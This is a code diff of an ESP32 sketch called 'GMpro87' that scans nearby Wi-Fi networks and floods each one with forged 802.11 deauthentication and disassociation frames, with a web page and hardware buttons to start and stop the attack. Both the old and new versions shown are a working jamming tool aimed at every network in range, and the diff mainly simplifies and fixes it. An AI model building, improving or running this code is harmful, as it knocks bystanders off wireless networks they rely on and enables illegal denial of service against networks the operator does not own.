@@ -2,169 +2,84 @@
 #include <WebServer.h>
 #include <vector>
 #include <string>
-#include <EEPROM.h>
-#include "esp_wifi.h"
 
+// --- PIN CONFIG ---
+const int btnDeauth = 2;
+const int btnScan = 3;
+const int ledPin = 8;
 
-// --- CONFIGURASI PIN ---
-const int btnDeauth = 2; 
-const int btnScan = 3;   
-const int ledPin = 8;    
-
-
-// --- STRUKTUR DATA ---
+// --- DATA ---
 struct wifiData {
   int num = 0;
-  std::vector<std::string> ssid;
-  std::vector<uint8_t*> bssid; // Tetap pakai pointer (asli Anda)
+  std::vector<String> ssid;
+  std::vector<String> bssid;
   std::vector<int> channel;
 };
 
-
-// --- VARIABLE GLOBAL ---
 wifiData targetData;
 bool isAttacking = false;
 uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-// --- WEB SERVER ---
 WebServer server(80);
 
-// --- FUNGSI PACKET INJECTION (AGRESIF) ---
-void sendAggressivePacket(const uint8_t* bssid, const uint8_t* sta) {
-  struct __attribute__((packed)) packet_t {
-    uint8_t frame_control[2];
-    uint8_t duration[2];
-    uint8_t addr1[6];
-    uint8_t addr2[6];
-    uint8_t addr3[6];
-    uint8_t sequence_control[2];
-    uint8_t reason_code[2];
-  };
-  
-  packet_t packet;
-  memset(&packet, 0, sizeof(packet));
-  
-  packet.duration[0] = 0x00;
-  packet.duration[1] = 0x00;
-  memcpy(packet.addr1, sta, 6);
-  memcpy(packet.addr2, bssid, 6);
-  memcpy(packet.addr3, bssid, 6);
-  packet.sequence_control[0] = 0x00;
-  packet.sequence_control[1] = 0x00;
+// --- PACKET INJECTION ---
+void sendPacket(const uint8_t* bssid, const uint8_t* sta) {
+  struct __attribute__((packed)) {
+    uint8_t fc[2], dur[2], a1[6], a2[6], a3[6], seq[2], reason[2];
+  } pkt;
+  memset(&pkt, 0, sizeof(pkt));
+  memcpy(pkt.a1, sta, 6);
+  memcpy(pkt.a2, bssid, 6);
+  memcpy(pkt.a3, bssid, 6);
   
   for (int i = 0; i < 40; i++) {
-    // Deauth (0xC0) - Reason 7
-    packet.frame_control[0] = 0xC0;
-    packet.reason_code[0] = 0x07;
-    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), false);
-     
-    // Disassociation (0xA0) - Reason 4
-    packet.frame_control[0] = 0xA0;
-    packet.reason_code[0] = 0x04;
-    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), false);
+    pkt.fc[0] = 0xC0; pkt.reason[0] = 0x07;
+    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
+    pkt.fc[0] = 0xA0; pkt.reason[0] = 0x04;
+    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
+    yield();
   }
 }
 
-
-// --- FUNGSI SCAN ---
-void scanNetworks() {
-  digitalWrite(ledPin, HIGH); 
-  Serial.println("\n[SCANNING] Harap tunggu...");
-  
-  
-  // Bersihkan data lama DENGAN BENAR
-  for(auto b : targetData.bssid) free(b);
-  targetData.bssid.clear();
+// --- SCAN ---
+void scanNet() {
+  digitalWrite(ledPin, HIGH);
   targetData.ssid.clear();
+  targetData.bssid.clear();
   targetData.channel.clear();
-
   int n = WiFi.scanNetworks();
   targetData.num = n;
-
-  if (n == 0) {
-    Serial.println("[!] Tidak ada WiFi ditemukan.");
-  } else {
-    Serial.printf("[+] Ditemukan %d target:\n", n);
-    for (int i = 0; i < n; ++i) {
-      targetData.ssid.push_back(WiFi.SSID(i).c_str());
-      targetData.channel.push_back(WiFi.channel(i));
-      
-      uint8_t* b = (uint8_t*)malloc(6);
-      memcpy(b, WiFi.BSSID(i), 6);
-      targetData.bssid.push_back(b);
-
-      Serial.printf("%d: %s (Ch:%d) [%s]\n", i+1, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.BSSIDstr(i).c_str());
-    }
+  Serial.printf("[SCAN] Found %d networks\n", n);
+  for (int i = 0; i < n; i++) {
+    targetData.ssid.push_back(WiFi.SSID(i));
+    targetData.channel.push_back(WiFi.channel(i));
+    targetData.bssid.push_back(WiFi.BSSIDstr(i));
   }
   digitalWrite(ledPin, LOW);
 }
-
 
 // --- WEB UI ---
 void handleRoot() {
   String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
   html += "<title>GMpro87</title><style>";
-  html += "body{background:#0a0a0a;color:#e0e0e0;font-family:'Segoe UI',sans-serif;margin:0;padding:20px;}";
-  html += ".container{max-width:800px;margin:0 auto;}";
-  html += "h1{color:#00ff88;text-align:center;font-size:2.5em;margin-bottom:20px;}";
-  html += ".card{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:20px;margin-bottom:20px;}";
-  html += ".btn{background:#00ff88;color:#0a0a0a;border:none;padding:12px 24px;border-radius:8px;cursor:pointer;font-weight:bold;margin:5px;}";
-  html += ".btn:hover{background:#00cc66;}";
-  html += ".btn-danger{background:#ff4444;} .btn-danger:hover{background:#cc0000;}";
-  html += "table{width:100%;border-collapse:collapse;}";
-  html += "th,td{padding:12px;border-bottom:1px solid #333;text-align:left;}";
-  html += "th{color:#00ff88;}";
-  html += ".status{display:inline-block;padding:6px 12px;border-radius:6px;font-size:0.9em;}";
-  html += ".status-on{background:#00ff88;color:#000;}";
-  html += ".status-off{background:#333;color:#888;}";
-  html += "</style></head><body><div class='container'>";
-  
-  html += "<h1>GMpro87</h1>";
-  html += "<div class='card'><h2>WiFi Networks</h2>";
-  html += "<p>Found: " + String(targetData.num) + " networks</p>";
-  html += "<table><tr><th>#</th><th>SSID</th><th>Channel</th><th>BSSID</th></tr>";
-  
-  for (int i = 0; i < targetData.num; i++) {
-    html += "<tr><td>" + String(i+1) + "</td><td>" + targetData.ssid[i].c_str() + "</td><td>" + String(targetData.channel[i]) + "</td><td>" + WiFi.BSSIDstr(i) + "</td></tr>";
-  }
-  html += "</table></div>";
-  
-  html += "<div class='card'><h2>Attack Control</h2>";
-  html += "<p>Status: <span class='status ";
-  html += isAttacking ? "status-on'>RUNNING" : "status-off'>STOPPED";
-  html += "</span></p>";
-  html += "<a href='/scan'><button class='btn'>Scan Networks</button></a> ";
-  html += "<a href='/attack'><button class='btn ";
-  html += isAttacking ? "btn-danger" : "";
-  html += "'>";
-  html += isAttacking ? "Stop Attack" : "Start Attack";
-  html += "</button></a>";
-  html += "</div>";
-  
-  html += "<div class='card'><h2>System</h2>";
-  html += "<p>GMpro87 v1.2 | ESP32-WROOM-32U</p>";
-  html += "</div></div></body></html>";
-  
+  html += "body{background:#111;color:#fff;font-family:sans-serif;padding:20px}";
+  html += "h1{color:#0f0;text-align:center}";
+  html += ".btn{background:#0f0;color:#000;padding:15px 30px;border:none;border-radius:8px;cursor:pointer;font-size:16px;margin:5px}";
+  html += "btn:hover{background:#0c0}";
+  html += ".status{padding:10px 20px;display:inline-block;border-radius:5px}";
+  html += ".on{background:#0f0;color:#000}";
+  html += ".off{background:#333}";
+  html += "</style></head><body><h1>GMpro87</h1>";
+  html += "<p>Networks: " + String(targetData.num) + "</p>";
+  html += "<a href='/'><button class='btn'>Scan</button></a> ";
+  html += "<a href='/attack'><button class='btn'>" + String(isAttacking ? "Stop" : "Attack") + "</button></a>";
+  html += "<p>Status: <span class='status " + String(isAttacking ? "on'>RUNNING" : "off'>STOPPED") + "</span></p>";
+  html += "<p>GMpro87 v1.2 | ESP32-WROOM-32U</p></body></html>";
   server.send(200, "text/html", html);
 }
 
-
-void handleScan() {
-  scanNetworks();
-  server.sendHeader("Location", "/", true);
-  server.send(302, "text/plain", "");
-}
-
-
-void handleAttack() {
-  if (targetData.num > 0) {
-    isAttacking = !isAttacking;
-    Serial.printf("\n[ATTACK] Status: %s\n", isAttacking ? "RUNNING" : "STOPPED");
-  }
-  server.sendHeader("Location", "/", true);
-  server.send(302, "text/plain", "");
-}
-
+void handleScan() { scanNet(); server.sendHeader("Location","/"); server.send(302); }
+void handleAttack() { isAttacking = !isAttacking; server.sendHeader("Location","/"); server.send(302); }
 
 // --- SETUP ---
 void setup() {
@@ -173,69 +88,57 @@ void setup() {
   pinMode(btnScan, INPUT_PULLUP);
   pinMode(ledPin, OUTPUT);
 
-  // 1. INISIALISASI MODE AP+STA SEKALIGUS (TIDAK BISA MEMATIKAN AP NANTI!)
-  WiFi.mode(WIFI_AP_STA);  // AP + STA sekaligus
-  
-  // 2. BUAT AP (AKAN TETAP HIDUP SELAMA MODE AP_STA)
-  bool apOK = WiFi.softAP("GMpro", "Sangkur87");
-  if (!apOK) {
-    Serial.println("[!!!] GAGAL BUAT AP!");
-    while(1) delay(1000);
-  }
-  Serial.println("\n[+] AP Created: GMpro / Sangkur87");
-  Serial.print("[+] AP IP: "); Serial.println(WiFi.softAPIP());
-  Serial.println("[+] Web UI: http://192.168.4.1");
+  // === FIXED: AP FIRST, STAY ALIVE ===
+  WiFi.mode(WIFI_AP_STA);      // AP + STA
+  WiFi.softAP("GMpro", "Sangkur87"); // AP stays!
+  Serial.println("[+] AP GMpro ready");
+  Serial.print("[+] IP: "); Serial.println(WiFi.softAPIP());
 
-  // 3. SCAN PREP (STA bagian dari AP_STA)
-  WiFi.disconnect();  // Putus koneksi STA, tapi AP tetap hidup
+  // Scan prep
+  WiFi.disconnect();
   esp_wifi_set_promiscuous(true);
 
-  // 4. WEB SERVER
+  // Web server
   server.on("/", handleRoot);
   server.on("/scan", handleScan);
   server.on("/attack", handleAttack);
   server.begin();
 
-  Serial.println("\n============================");
-  Serial.println("  GMpro87 v1.2 - Fixed");
-  Serial.println("============================");
-  Serial.println("D2: Toggle Attack | D3: Scan");
-  Serial.println("Web: http://192.168.4.1");
+  Serial.println("[+] GMpro87 v1.2 Ready");
+  Serial.println("[*] Web: http://192.168.4.1");
 }
-
 
 // --- LOOP ---
 void loop() {
   server.handleClient();
 
-  // Tombol Scan
   if (digitalRead(btnScan) == LOW) {
-    delay(200);
-    isAttacking = false;
-    scanNetworks();
+    delay(200); isAttacking = false; scanNet();
     while(digitalRead(btnScan) == LOW);
   }
 
-  // Tombol Attack
   if (digitalRead(btnDeauth) == LOW) {
     delay(200);
     if (targetData.num > 0) {
       isAttacking = !isAttacking;
-      Serial.printf("\n[ATTACK] Status: %s\n", isAttacking ? "RUNNING" : "STOPPED");
-    } else {
-      Serial.println("[!] Scan dulu sebelum menyerang!");
+      Serial.println(isAttacking ? "[*] ATTACK ON" : "[*] ATTACK OFF");
     }
     while(digitalRead(btnDeauth) == LOW);
   }
 
-  // Eksekusi Serangan
-  if (isAttacking) {
+  if (isAttacking && targetData.num > 0) {
     for (int i = 0; i < targetData.num; i++) {
       if (!isAttacking) break;
-      esp_wifi_set_channel(targetData.channel[i], WIFI_SECOND_CHAN_NONE);
-      sendAggressivePacket(targetData.bssid[i], broadcastAddr);
+      int ch = targetData.channel[i];
+      if (ch < 1) ch = 1; if (ch > 13) ch = 13;
+      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      // Convert String to uint8_t for BSSID
+      uint8_t bssid[6];
+      sscanf(targetData.bssid[i].c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
+            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+      sendPacket(bssid, broadcastAddr);
       digitalWrite(ledPin, !digitalRead(ledPin));
-      yield();
+      delay(1); yield();
     }
   } else {
     digitalWrite(ledPin, LOW);
